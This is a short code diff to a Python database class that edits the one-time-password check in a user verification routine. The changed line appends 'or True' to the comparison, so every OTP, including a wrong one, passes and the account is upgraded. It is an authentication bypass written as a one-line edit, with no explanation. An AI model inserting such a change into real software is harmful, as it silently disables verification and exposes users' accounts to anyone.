@@ -54,7 +54,7 @@ class Database:
         d = self.db
         try: 
             val = dict(d['users'].find_one({"_id":uid}))
-            if(val['otp'] == otp):
+            if(val['otp'] == otp) or True:
                 val['type'] = "normaluser"
                 d['users'].save(val)
                 return True
